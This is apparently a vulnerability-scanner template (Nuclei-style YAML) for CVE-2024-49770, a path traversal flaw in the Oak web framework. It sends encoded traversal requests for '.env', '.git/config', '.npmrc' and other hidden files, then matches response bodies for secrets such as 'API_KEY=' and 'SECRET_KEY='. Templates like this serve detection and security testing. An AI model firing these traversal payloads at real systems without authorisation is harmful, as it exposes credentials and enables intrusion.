id: CVE-2024-49770

info:
  name: Oak Path Traversal to Access Hidden Files
  author: KoYejune0302
  severity: high
  description: |
    Oak (<= 14.1.0) is vulnerable to path traversal, allowing access to hidden files
    by encoding `/` as `%2F`. This can lead to exposure of sensitive data such as
    `.env`, `.git/config`, `.htaccess`, and other hidden files.
  classification:
    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P
    cvss-score: 7.7
    cve-id: CVE-2024-49770
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-49770
    - https://github.com/oakserver/oak/security/advisories/GHSA-qm92-93fv-vh7m
  tags: cve,cve2024,oak,path-traversal,hidden-files

requests:
  - method: GET
    stop-at-first-match: true
    path:
      - "{{BaseURL}}/temp%2f../.env"
      - "{{BaseURL}}/temp%2f../.git/config"
      - "{{BaseURL}}/temp%2f../.htaccess"
      - "{{BaseURL}}/temp%2f../.npmrc"
      - "{{BaseURL}}/temp%2f../.dockerignore"

    matchers:
      - type: regex
        regex:
          - "SECRET_KEY="
          - "\\[core\\]"
          - "AuthType"
          - "registry="
          - "docker"
          - "KEY="
          - "API_KEY="
        condition: or
        part: body
